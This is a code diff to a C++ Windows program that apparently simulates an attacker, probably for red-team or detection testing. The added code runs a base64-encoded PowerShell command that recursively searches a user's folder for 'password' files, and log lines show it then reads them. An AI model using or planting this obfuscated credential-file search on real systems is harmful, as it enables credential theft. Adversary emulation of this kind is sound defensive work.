@@ -7,6 +7,37 @@ int wmain() {
 	Log("[*] Running as " + GetUserAndContext(), componentName);
 
 	// TODO: simulate attacker looking for password docs with powershell
+	Log("[*] Searching for password doc", componentName);
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	// Get-ChildItem -Path C:\Users\NineBall -Filter 'password' -Recurse -ErrorAction Continue -Force
+	std::wstring cmd = L"powershell.exe -encodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAE4AaQBuAGUAQgBhAGwAbAAgAC0ARgBpAGwAdABlAHIAIAAnAHAAYQBzAHMAdwBvAHIAZAAnACAALQBSAGUAYwB1AHIAcwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQA=";
+
+	if (!CreateProcessW(
+		NULL,
+		const_cast<LPWSTR>(cmd.c_str()),
+		NULL,
+		NULL,
+		FALSE,
+		0,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	)) {
+		Log("[!] Failed to create password doc search powershell process." + std::to_string(GetLastError()), componentName);
+	}
+	else {
+		Log("[+] Successfully created password doc search powershell process.", componentName);
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 
 	// read passwords in doc
 	Log("[+] Reading password doc.", componentName);
